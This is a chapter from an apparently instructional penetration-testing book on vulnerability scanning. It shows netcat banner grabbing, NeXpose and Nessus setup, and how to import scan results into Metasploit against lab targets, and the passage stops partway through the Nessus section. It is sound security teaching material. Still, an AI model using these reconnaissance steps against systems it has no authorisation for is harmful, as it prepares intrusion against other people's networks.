<html><head></head><body><section epub:type="chapter" id="vulnerability_scanning"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 4. Vulnerability Scanning</h2></div></div></div><p class="calibre2">A <span class="strong"><em class="calibre4">vulnerability scanner</em></span> is an automated program designed to look for weaknesses in computers, computer systems, networks, and applications. The program probes a system by sending data to it over a network and analyzing the responses received, in an effort to enumerate any vulnerabilities present on the target by using its vulnerability database as reference.<a id="IDX-CHP-4-0001" class="strong"/></p><p class="calibre2">Various operating systems tend to respond differently when sent particular network probes because of the different networking implementations in use. These unique responses serve as a fingerprint that the vulnerability scanner uses to determine the operating system version and even its patch level. A vulnerability scanner can also use a given set of user credentials to log into the remote system and enumerate the software and services to determine whether they are patched. With the results it obtains, the scanner presents a report outlining any vulnerabilities detected on the system. That report can be useful for both network administrators and penetration testers.</p><p class="calibre2">Vulnerability scanners generally create a lot of traffic on a network and are therefore not typically used in a penetration test when one of the objectives is to remain undetected. If, however, you are running a penetration test and stealth is not an issue, a vulnerability scanner can save you from having to probe systems manually to determine their patch levels and vulnerabilities.<a id="IDX-CHP-4-0002" class="strong"/><a id="IDX-CHP-4-0003" class="strong"/><a id="IDX-CHP-4-0004" class="strong"/><a id="IDX-CHP-4-0005" class="strong"/><a id="IDX-CHP-4-0006" class="strong"/></p><p class="calibre2">Whether you use an automated scanner or do it manually, scanning is one of the most important steps in the penetration testing process; if done thoroughly, it will provide the best value to your client. In this chapter, we will discuss a number of vulnerability scanners and how they can be integrated within Metasploit. We’ll highlight some auxiliary modules in the Metasploit Framework that can locate specific vulnerabilities in remote systems.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="the_basic_vulnerability_scan">The Basic Vulnerability Scan</h2></div></div></div><p class="calibre2">Let’s look at how a scan works at the most basic level. In the following listing, we use <span class="strong"><em class="calibre4">netcat</em></span> to grab a banner from the target 192.168.1.203. <span class="strong"><em class="calibre4">Banner grabbing</em></span> is the act of connecting to a remote network service and reading the service identification (banner) that is returned. Many network services such as web, file transfer, and mail servers return their banner either immediately upon connecting to them or in response to a specific command. Here we connect to a web server on TCP port 80 and issue a <code class="literal">GET HTTP</code> request that allows us to look at the header information that the remote server returns in response to our request.<a id="IDX-CHP-4-0007" class="strong"/><a id="IDX-CHP-4-0008" class="strong"/></p><a id="I_programlisting4_d1e2976" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">nc 192.168.1.203 80</code></strong>
  <strong class="calibre3"><code class="calibre6">GET HTTP 1/1</code></strong>
  HTTP/1.1 400 Bad Request
<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> Server: <em class="calibre4"><code class="calibre9">Microsoft-IIS/5.1</code></em></pre><p class="calibre2">The information returned at <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e2994" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> tells us that the system running on port 80 is a Microsoft IIS 5.1–based web server. Armed with this information, we could use a vulnerability scanner, as shown in <a class="xref" href="part0008.html#vulnerability_scan_results_against_the_t">Figure 4-1</a>, to determine whether this version of IIS has any vulnerabilities associated with it and whether this particular server has been patched.</p><p class="calibre2">Of course, in practice, it’s not that simple. Vulnerability scans often contain many <span class="strong"><em class="calibre4">false positives</em></span> (reported vulnerability where none exists) and <span class="strong"><em class="calibre4">false negatives</em></span> (failure to log a vulnerability where one exists) due to subtle differences in system and application configurations. In addition, the creators of vulnerability scanners have an incentive to report positives: The more “hits” a vulnerability scanner finds, the better it looks to a potential buyer. Vulnerability scanners are only as good as their vulnerabilities database, and they can easily be fooled by misleading banners or inconsistent configurations.</p><p class="calibre2">Let’s take a look at some of the more useful vulnerability scanners, including NeXpose, Nessus, and some specialized scanners.</p><div class="figure"><a id="vulnerability_scan_results_against_the_t" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3015" class="strong"/><img src="../images/00008.jpeg" alt="Vulnerability scan results against the target web server" hisrc="httpatomoreillycomsourcenostarchimages867470.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-1. Vulnerability scan results against the target web server</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="scanning_with_nexpose">Scanning with NeXpose</h2></div></div></div><p class="calibre2">NeXpose is Rapid7’s vulnerability scanner that scans networks to identify the devices running on them and performs checks to identify security weaknesses in operating systems and applications. It then analyzes the scan data and processes it for inclusion in various reports.<a id="IDX-CHP-4-0009" class="strong"/><a id="IDX-CHP-4-0010" class="strong"/><a id="IDX-CHP-4-0011" class="strong"/><a id="IDX-CHP-4-0012" class="strong"/></p><p class="calibre2">Rapid7 offers multiple versions of NeXpose, but we’ll use the Community edition because it’s free. If you plan to use NeXpose commercially, see the Rapid7 site (<a class="xref" href="http://www.rapid7.com/vulnerability-scanner.jsp" target="_top">http://www.rapid7.com/vulnerability-scanner.jsp</a>) for information on the various versions and their capabilities and pricing.<a id="IDX-CHP-4-0013" class="strong"/></p><p class="calibre2">Our target for scanning will be a default installation of Windows XP SP2 as configured in <a class="xref" href="part0022.html#configuring_your_target_machines">Appendix A</a>. We will first perform a basic overt scan of our target and import the vulnerability scan results into Metasploit. We will close out this section by showing you how to run a NeXpose vulnerability scan directly from <span class="strong"><em class="calibre4">msfconsole</em></span> rather than using the web-based GUI, eliminating the need to import a scan report.<a id="IDX-CHP-4-0014" class="strong"/><a id="IDX-CHP-4-0015" class="strong"/><a id="IDX-CHP-4-0016" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="configuration">Configuration</h3></div></div></div><p class="calibre2">After installing NeXpose Community, open a web browser and navigate to <span class="strong"><em class="calibre4">https://&lt;youripaddress&gt;:3780</em></span>. Accept the NeXpose self-signed certificate, and log in using the credentials you created during setup. You should next be presented with an interface similar to the one shown in <a class="xref" href="part0008.html#the_nexposeas_initial_home_screen">Figure 4-2</a>. (You’ll find complete installation instructions for NeXpose at the Rapid7 website.)</p><p class="calibre2">On the NeXpose main page, you will notice a number of tabs at the top of the interface:</p><div class="book"><ul class="itemizedlist"><li class="listitem">The Assets tab <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e3088" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> displays details of computers and other devices on your network after they have been scanned.<a id="IDX-CHP-4-0017" class="strong"/></li><li class="listitem">The Reports tab <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e3102" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> lists vulnerability scan reports after they have been generated.</li><li class="listitem">The Vulnerabilities tab <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e3111" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> gives you details on any vulnerabilities discovered during your scans.<a id="IDX-CHP-4-0018" class="strong"/></li><li class="listitem">The Administration tab <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e3125" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> allows you to configure various options.<a id="IDX-CHP-4-0019" class="strong"/></li></ul></div><div class="figure"><a id="the_nexposeas_initial_home_screen" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3139" class="strong"/><img src="../images/00009.jpeg" alt="The NeXpose’s initial home screen" hisrc="httpatomoreillycomsourcenostarchimages867472.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-2. The NeXpose’s initial home screen</div></div><p class="calibre2">Buttons in the main body of the page let you perform common tasks such as creating a new site or setting up a new vulnerability scan.<a id="IDX-CHP-4-0020" class="strong"/><a id="IDX-CHP-4-0021" class="strong"/><a id="IDX-CHP-4-0022" class="strong"/><a id="IDX-CHP-4-0023" class="strong"/><a id="IDX-CHP-4-0024" class="strong"/></p><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="the_new_site_wizard">The New Site Wizard</h4></div></div></div><p class="calibre2">Prior to running a vulnerability scan with NeXpose, you need to configure a <span class="strong"><em class="calibre4">site</em></span> — a logical collection of devices such as a specific subnet, a collection of servers, or even a single workstation. These sites will then be scanned by NeXpose, and different scan types can be defined for a particular site.</p><div class="book"><ol class="orderedlist" type="1"><li class="listitem" value="1">To create a site, click the <span class="strong"><strong class="calibre3">New Site</strong></span> button on the NeXpose home page, enter a name for your site and a brief description, and then click <span class="strong"><strong class="calibre3">Next</strong></span>.</li><li class="listitem" value="2">In the devices step, shown in <a class="xref" href="part0008.html#adding_a_device_to_the_new_nexpose_site">Figure 4-3</a>, you have quite a bit of granularity in defining your targets. You can add a single IP address, address ranges, hostnames, and more. You can also declare devices, such as printers, to exclude from scans. (Printers frequently don’t take kindly to being scanned. We have seen instances in which a simple vulnerability scan caused more than one million pages of pure black to be placed in the queue to print!) Click <span class="strong"><strong class="calibre3">Next</strong></span> when you have finished adding and excluding devices.</li><li class="listitem" value="3">At the scan setup step, you can choose from several different scan templates, such as Discovery Scan and Penetration test; select the scanning engine you want to use; or set up an automated scanning schedule. For purposes of this initial walk-through, keep the default selections and click <span class="strong"><strong class="calibre3">Next</strong></span> to continue.</li><li class="listitem" value="4">Add credentials for the site you want to scan, if you have them. Credentials can help create more accurate and complete results by performing in-depth enumeration of installed software and system policies on the target.</li><li class="listitem" value="5">On the Credentials tab, click the <span class="strong"><strong class="calibre3">New Login</strong></span> button, type a username and password for the IP address you want to scan, and then click <span class="strong"><strong class="calibre3">Test Login</strong></span> to verify your credentials then save them.<a id="IDX-CHP-4-0025" class="strong"/><div class="figure1"><a id="adding_a_device_to_the_new_nexpose_site" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3223" class="strong"/><img src="../images/00010.jpeg" alt="Adding a device to the new NeXpose site" hisrc="httpatomoreillycomsourcenostarchimages867474.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-3. Adding a device to the new NeXpose site</div></div></li><li class="listitem" value="6">Last, click <span class="strong"><strong class="calibre3">Save</strong></span> to complete the New Site wizard and return to the Home tab, which should list your newly added site, as shown in <a class="xref" href="part0008.html#the_home_tab_shows_the_newly_configured">Figure 4-4</a>.<a id="IDX-CHP-4-0026" class="strong"/><a id="IDX-CHP-4-0027" class="strong"/><a id="IDX-CHP-4-0028" class="strong"/><a id="IDX-CHP-4-0029" class="strong"/><div class="figure1"><a id="the_home_tab_shows_the_newly_configured" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3259" class="strong"/><img src="../images/00011.jpeg" alt="The Home tab shows the newly configured site." hisrc="httpatomoreillycomsourcenostarchimages867476.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-4. The Home tab shows the newly configured site.</div></div></li></ol></div></div><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="the_new_manual_scan_wizard">The New Manual Scan Wizard</h4></div></div></div><p class="calibre2">With your new site configured, you are now set to configure your first scan:</p><div class="book"><ol class="orderedlist" type="1"><li class="listitem" value="1">Click the <span class="strong"><strong class="calibre3">New Manual Scan</strong></span> button shown in <a class="xref" href="part0008.html#the_home_tab_shows_the_newly_configured">Figure 4-4</a>. You should see the Start New Scan dialog shown in <a class="xref" href="part0008.html#the_nexpose_scan_configuration_dialog">Figure 4-5</a>, which prompts you for the assets you want to scan or exclude. In this example, we are scanning our default Windows XP system.<a id="IDX-CHP-4-0030" class="strong"/></li><li class="listitem" value="2">Double-check your target IP address to be sure that you’re not about to scan the wrong device or network inadvertently, and click the <span class="strong"><strong class="calibre3">Start Now</strong></span> button to begin.<div class="figure1"><a id="the_nexpose_scan_configuration_dialog" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3294" class="strong"/><img src="../images/00012.jpeg" alt="The NeXpose scan configuration dialog" hisrc="httpatomoreillycomsourcenostarchimages867478.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-5. The NeXpose scan configuration dialog</div></div></li><li class="listitem" value="3">NeXpose should dynamically refresh the page as the scan progresses. Wait until the status for both Scan Progress and Discovered Assets shows <span class="strong"><em class="calibre4">Completed</em></span>, as shown in <a class="xref" href="part0008.html#the_completed_nexpose_scan_and_report">Figure 4-6</a>. Under the Scan Progress section, you can see that our single scanned device has 268 vulnerabilities detected, and under Discovered Assets, you are provided with more information about the target such as the device name and its operating system. Now click the <span class="strong"><strong class="calibre3">Reports</strong></span> tab.<a id="IDX-CHP-4-0031" class="strong"/><a id="IDX-CHP-4-0032" class="strong"/><a id="IDX-CHP-4-0033" class="strong"/></li></ol></div><div class="figure"><a id="the_completed_nexpose_scan_and_report" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3328" class="strong"/><img src="../images/00013.jpeg" alt="The completed NeXpose scan and report" hisrc="httpatomoreillycomsourcenostarchimages867480.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-6. The completed NeXpose scan and report</div></div></div><div class="sect"><div class="titlepage"><div class="book"><div class="book"><h4 class="title5" id="the_new_report_wizard">The New Report Wizard</h4></div></div></div><p class="calibre2">If this is your first time running NeXpose and you have completed only one scan, the Reports tab should show that you have generated no reports.<a id="IDX-CHP-4-0034" class="strong"/><a id="IDX-CHP-4-0035" class="strong"/><a id="IDX-CHP-4-0036" class="strong"/></p><div class="book"><ol class="orderedlist" type="1"><li class="listitem" value="1">Click <span class="strong"><strong class="calibre3">New Report</strong></span>, as shown in <a class="xref" href="part0008.html#the_nexpose_reports_tab">Figure 4-7</a>, to start the New Report wizard.<div class="figure1"><a id="the_nexpose_reports_tab" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3365" class="strong"/><img src="../images/00014.jpeg" alt="The NeXpose Reports tab" hisrc="httpatomoreillycomsourcenostarchimages867482.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-7. The NeXpose Reports tab</div></div></li><li class="listitem" value="2">Enter a friendly name, and then in the Report format field, select <span class="strong"><strong class="calibre3">NeXpose Simple XML Export</strong></span>, as shown in <a class="xref" href="part0008.html#selecting_a_name_and_format_for_the_repo">Figure 4-8</a>, so that you will be able to import the scan results into Metasploit. You can select from different report templates and configure the time zone if you happen to be conducting your pen test on the road. Click <span class="strong"><strong class="calibre3">Next</strong></span> when you are ready to proceed.<a id="IDX-CHP-4-0037" class="strong"/><div class="figure1"><a id="selecting_a_name_and_format_for_the_repo" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3389" class="strong"/><img src="../images/00015.jpeg" alt="Selecting a name and format for the report" hisrc="httpatomoreillycomsourcenostarchimages867484.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-8. Selecting a name and format for the report</div></div></li><li class="listitem" value="3">In the subsequent window, add the devices you want to be included in the report by clicking <span class="strong"><strong class="calibre3">Select Sites</strong></span> to add your scanned target range, as shown in <a class="xref" href="part0008.html#selecting_the_site_for_inclusion_in_the">Figure 4-9</a>. Then click <span class="strong"><strong class="calibre3">Save</strong></span>.<div class="figure1"><a id="selecting_the_site_for_inclusion_in_the" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3408" class="strong"/><img src="../images/00016.jpeg" alt="Selecting the site for inclusion in the report" hisrc="httpatomoreillycomsourcenostarchimages867486.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-9. Selecting the site for inclusion in the report</div></div></li><li class="listitem" value="4">In the Select Devices dialog, select the targets to include in your report and then click <span class="strong"><strong class="calibre3">Save</strong></span>.<a id="IDX-CHP-4-0038" class="strong"/><a id="IDX-CHP-4-0039" class="strong"/><a id="IDX-CHP-4-0040" class="strong"/><a id="IDX-CHP-4-0041" class="strong"/><a id="IDX-CHP-4-0042" class="strong"/><a id="IDX-CHP-4-0043" class="strong"/><a id="IDX-CHP-4-0044" class="strong"/><a id="IDX-CHP-4-0045" class="strong"/></li><li class="listitem" value="5">Back in the Report Configuration wizard, click <span class="strong"><strong class="calibre3">Save</strong></span> to accept the remaining defaults for the report. The Reports tab should now list the newly created report, as shown in <a class="xref" href="part0008.html#the_reports_tab_lists_your_reports">Figure 4-10</a>. (Be sure to save the report file so that you can use it with the Framework.)<a id="IDX-CHP-4-0046" class="strong"/><div class="figure1"><a id="the_reports_tab_lists_your_reports" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3469" class="strong"/><img src="../images/00017.jpeg" alt="The Reports tab lists your reports." hisrc="httpatomoreillycomsourcenostarchimages867488.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-10. The Reports tab lists your reports.</div></div></li></ol></div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="importing_your_report_into_the_metasploi">Importing Your Report into the Metasploit Framework</h3></div></div></div><p class="calibre2">Having completed a full vulnerability scan with NeXpose, you need to import the results into Metasploit. But before you do, you must create a new database from <span class="strong"><em class="calibre4">msfconsole</em></span> by issuing <code class="literal">db_connect</code>. After creating that database you’ll import the NeXpose XML using the <code class="literal">db_import</code> command. Metasploit will automatically detect that the file is from NeXpose and import the scanned host. You can then verify that the import was successful by running the <code class="literal">db_hosts</code> command. (These steps are shown in the following listing.) As you can see at <span class="inlinemediaobject"><a id="I_inlinemediaobject4_d1e3491" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, Metasploit knows about the 268 vulnerabilities that your scan picked up.<a id="IDX-CHP-4-0047" class="strong"/></p><a id="I_programlisting4_d1e3501" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_connect postgres:toor@127.0.0.1/msf3</code></strong>
msf &gt; <strong class="calibre3"><code class="calibre6">db_import /tmp/host_195.xml</code></strong>
[*] Importing 'NeXpose Simple XML' data
[*] Importing host 192.168.1.195
[*] Successfully imported /tmp/host_195.xml

msf &gt; <strong class="calibre3"><code class="calibre6">db_hosts -c address,svcs,vulns</code></strong>

Hosts
=====

address        Svcs  Vulns  Workspace
-------        ----  -----  ---------
192.168.1.195  8     268<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>  default</pre><p class="calibre2">To display the full details of the vulnerabilities imported into Metasploit, including Common Vulnerabilities and Exposures (CVE) numbers and other references, run the following:<a id="IDX-CHP-4-0048" class="strong"/></p><a id="I_programlisting4_d1e3523" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_vulns</code></strong></pre><p class="calibre2">As you can see, running an overt vulnerability scan with full credentials can provide an amazing amount of information — 268 vulnerabilities found in this case. But, of course, this has been a very noisy scan, likely to attract lots of attention. These types of vulnerability scans are best used in a pen test where being stealthy is not required.<a id="IDX-CHP-4-0049" class="strong"/><a id="IDX-CHP-4-0050" class="strong"/><a id="IDX-CHP-4-0051" class="strong"/><a id="IDX-CHP-4-0052" class="strong"/><a id="IDX-CHP-4-0053" class="strong"/><a id="IDX-CHP-4-0054" class="strong"/><a id="IDX-CHP-4-0055" class="strong"/><a id="IDX-CHP-4-0056" class="strong"/><a id="IDX-CHP-4-0057" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="running_nexpose_within_msfconsole">Running NeXpose Within MSFconsole</h3></div></div></div><p class="calibre2">Running NeXpose from the web GUI is great for fine-tuning vulnerability scans and generating reports, but if you prefer to remain in <span class="strong"><em class="calibre4">msfconsole</em></span>, you can still run full vulnerability scans with the NeXpose plug-in included in Metasploit.</p><p class="calibre2">To demonstrate the difference in results between a credentialed and noncredentialed scan, we will run a scan from with Metasploit without specifying a username and password for the target system. Before you begin, delete any existing database with <code class="literal">db_destroy</code>, create a new database in Metasploit with <code class="literal">db_connect</code>, and then load the NeXpose plug-in with <code class="literal">load nexpose</code> as shown next:<a id="IDX-CHP-4-0058" class="strong"/><a id="IDX-CHP-4-0059" class="strong"/></p><a id="I_programlisting4_d1e3589" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_destroy postgres:toor@127.0.0.1/msf3</code></strong>
[*] Warning: You will need to enter the password at the prompts below
Password:

msf &gt; <strong class="calibre3"><code class="calibre6">db_connect postgres:toor@127.0.0.1/msf3</code></strong>


msf &gt; <strong class="calibre3"><code class="calibre6">load nexpose</code></strong>

[*] NeXpose integration has been activated
[*] Successfully loaded plugin: nexpose</pre><p class="calibre2">With the NeXpose plug-in loaded, have a look at the commands loaded specifically for the vulnerability scanner by entering the <strong class="calibre3"><code class="calibre6">help</code></strong> command. You should see a series of new commands at the top of the listing specific to running NeXpose.</p><a id="I_programlisting4_d1e3605" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">help</code></strong></pre><p class="calibre2">Before running your first scan from <span class="strong"><em class="calibre4">msfconsole</em></span>, you will need to connect to your NeXpose installation. Enter <strong class="calibre3"><code class="calibre6">nexpose_connect -h</code></strong> to display the usage required to connect; add your username, password, and host address; and accept the SSL certificate warning by adding <code class="literal">ok</code> to the end of the connect string:</p><a id="I_programlisting4_d1e3620" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nexpose_connect -h</code></strong>
[*] Usage:
[*]        nexpose_connect username:password@host[:port] &lt;ssl-confirm&gt;
[*]         -OR-
[*]        nexpose_connect username password host port &lt;ssl-confirm&gt;
msf &gt; <strong class="calibre3"><code class="calibre6">nexpose_connect dookie:s3cr3t@192.168.1.206 ok</code></strong>
[*] Connecting to NeXpose instance at 192.168.1.206:3780 with username dookie...</pre><p class="calibre2">Now enter <strong class="calibre3"><code class="calibre6">nexpose_scan</code></strong> followed by the target IP address to initiate a scan, as shown next. In this example, we are scanning a single IP address, but you could also pass a range of hosts to the scanner (192.168.1.1-254) or a subnet in Classless Inter-Domain Routing (CIDR) notation (192.168.1.0/24).<a id="IDX-CHP-4-0060" class="strong"/><a id="IDX-CHP-4-0061" class="strong"/><a id="IDX-CHP-4-0062" class="strong"/><a id="IDX-CHP-4-0063" class="strong"/><a id="IDX-CHP-4-0064" class="strong"/><a id="IDX-CHP-4-0065" class="strong"/></p><a id="I_programlisting4_d1e3659" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">nexpose_scan 192.168.1.195</code></strong>
[*] Scanning 1 addresses with template pentest-audit in sets of 32
[*] Completed the scan of 1 addresses
msf &gt;</pre><p class="calibre2">After the NeXpose scan completes, the database you created earlier should contain the results of the vulnerability scan. To view the results, enter <strong class="calibre3"><code class="calibre6">db_hosts</code></strong>, as shown next. (In this example, the output has been trimmed by filtering on the address column.)</p><a id="I_programlisting4_d1e3670" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_hosts -c address</code></strong>

Hosts
=====

address        Svcs  Vulns  Workspace
-------        ----  -----  ---------
192.168.1.195  8    7     default

msf &gt;</pre><p class="calibre2">As you can see, NeXpose has discovered seven vulnerabilities. Run <strong class="calibre3"><code class="calibre6">db_vulns</code></strong> to display the vulnerabilities found:</p><a id="I_programlisting4_d1e3680" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">db_vulns</code></strong></pre><p class="calibre2">Although this scan has found significantly fewer than the 268 vulnerabilities discovered with our prior use of NeXpose through the GUI with credentials, you should have enough vulnerabilities here to get a great head start on exploiting the system.</p></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="scanning_with_nessus">Scanning with Nessus</h2></div></div></div><p class="calibre2">The Nessus vulnerability scanner from Tenable Security (<a class="xref" href="http://www.tenable.com/" target="_top">http://www.tenable.com/</a>) is one of the most widely used vulnerability scanners. Metasploit’s Nessus plug-in lets you launch scans and pull information from Nessus scans via the console, but in the example that follows, we’ll import Nessus scan results independently. Using Nessus 4.4.1 with a free Home Feed, we’ll run this scan against the same target we’ll use throughout this chapter, with known credentials. In these early stages of a penetration test, the more tools you can use to fine-tune your future attacks, the better.<a id="IDX-CHP-4-0066" class="strong"/><a id="IDX-CHP-4-0067" class="strong"/><a id="IDX-CHP-4-0068" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="nessus_configuration">Nessus Configuration</h3></div></div></div><p class="calibre2">After you have downloaded and installed Nessus, open your web browser and navigate to <span class="strong"><em class="calibre4">https://&lt;youripaddress&gt;:8834</em></span>, accept the certificate warning, and log into Nessus using the credentials you created during installation. You should see the main Nessus window, as shown in <a class="xref" href="part0008.html#the_main_nessus_window">Figure 4-11</a>.<a id="IDX-CHP-4-0069" class="strong"/></p><div class="figure"><a id="the_main_nessus_window" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3722" class="strong"/><img src="../images/00018.jpeg" alt="The main Nessus window" hisrc="httpatomoreillycomsourcenostarchimages867490.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-11. The main Nessus window</div></div><p class="calibre2">On login, you will see the Reports section, where any prior vulnerability scans should be listed. Along the top of the interface, you should see the Scans tab, where you can create and view scanning tasks; the Policies tab, where you configure Nessus to include various plug-ins you want to use in your scans; and the Users tab, where you can add user accounts to the Nessus server.<a id="IDX-CHP-4-0070" class="strong"/><a id="IDX-CHP-4-0071" class="strong"/><a id="IDX-CHP-4-0072" class="strong"/><a id="IDX-CHP-4-0073" class="strong"/><a id="IDX-CHP-4-0074" class="strong"/><a id="IDX-CHP-4-0075" class="strong"/><a id="IDX-CHP-4-0076" class="strong"/><a id="IDX-CHP-4-0077" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="creating_a_nessus_scan_policy">Creating a Nessus Scan Policy</h3></div></div></div><p class="calibre2">Before beginning a scan, you first need to create a Nessus scan policy. On the Policies tab, click the green <span class="strong"><strong class="calibre3">Add</strong></span> button to open the policy configuration window shown in <a class="xref" href="part0008.html#the_nessus_policies_configuration_window">Figure 4-12</a>.</p><div class="figure"><a id="the_nessus_policies_configuration_window" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3782" class="strong"/><img src="../images/00019.jpeg" alt="The Nessus Policies configuration window" hisrc="httpatomoreillycomsourcenostarchimages867492.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-12. The Nessus Policies configuration window</div></div><p class="calibre2">You’ll see many available options, all of which can be found in Nessus’s documentation.<a id="IDX-CHP-4-0078" class="strong"/></p><div class="book"><ol class="orderedlist" type="1"><li class="listitem" value="1">Enter a name for the scan, as shown in <a class="xref" href="part0008.html#the_nessus_general_settings">Figure 4-13</a>. We will use the name <span class="strong"><em class="calibre4">The_Works</em></span> in our example to have Nessus run all of its checks. Then click <span class="strong"><strong class="calibre3">Next</strong></span>.</li><li class="listitem" value="2">As with the NeXpose scan conducted earlier, we will configure this scan to use Windows login credentials to get a more complete picture of the vulnerabilities present on the target system. Enter the login credentials for your target system and click <span class="strong"><strong class="calibre3">Next</strong></span>.<a id="IDX-CHP-4-0079" class="strong"/><div class="figure1"><a id="the_nessus_general_settings" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3818" class="strong"/><img src="../images/00020.jpeg" alt="The Nessus General settings" hisrc="httpatomoreillycomsourcenostarchimages867494.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-13. The Nessus General settings</div></div></li><li class="listitem" value="3">On the Plugins page, you can choose from a large variety of Nessus plug-ins for Windows, Linux, BSD, and more. If, during a scan, you know you are going to scan only Windows-based systems, for example, you could deselect many of these plug-ins for your first run-through; for now, click <span class="strong"><strong class="calibre3">Enable All</strong></span> (shown in the lower-right corner of <a class="xref" href="part0008.html#selecting_nessus_scan_plug-ins">Figure 4-14</a>) and then click <span class="strong"><strong class="calibre3">Next</strong></span>.<a id="IDX-CHP-4-0080" class="strong"/><div class="figure1"><a id="selecting_nessus_scan_plug-ins" class="strong"/><div class="book"><div class="mediaobject"><a id="I_mediaobject4_d1e3842" class="strong"/><img src="../images/00021.jpeg" alt="Selecting Nessus scan plug-ins" hisrc="httpatomoreillycomsourcenostarchimages867496.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-14. Selecting Nessus scan plug-ins</div></div></li><li class="listitem" value="4">The final step in setting up the new policy is the Preferences page. Here, you can direct Nessus not to scan fragile devices such as network printers, configure it to store results in an external database, provide login credentials, and more. When you are done with your selections, click <span class="strong"><strong class="calibre3">Submit</strong></span> to save the new policy. Your newly added policy should be displayed under Policies, as shown in <a class="xref" href="part0008.html#the_newly_added_policy_in_nessus">Figure 4-15</a>.<a id="IDX-CHP-4-0081" class="strong"/><a id="IDX-CHP-4-0082" class="strong"/><a id="IDX-CHP-4-0083" class="strong"/><a id="IDX-CHP-4-0084" class="strong"/><a id="IDX-CHP-4-0085" class="strong"/><a id="IDX-CHP-4-0086" class="strong"/><a id="IDX-CHP-4-0087" class="strong"/><a id="IDX-CHP-4-0088" class="strong"/><a id="IDX-CHP-4-0089" class="strong"/><a id="IDX-CHP-4-0090" class="strong"/></li></ol></div><div class="figure"><a id="the_newly_added_policy_in_nessus" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject4_d1e3913" class="strong"/><img src="../images/00022.jpeg" alt="The newly added policy in Nessus" hisrc="httpatomoreillycomsourcenostarchimages867498.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 4-15. The newly added policy in Nessus</div></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="running_a_nessus_scan">Running a Nessus Scan</h3></div></div></div><p class="calibre2">After you have created a scan policy, 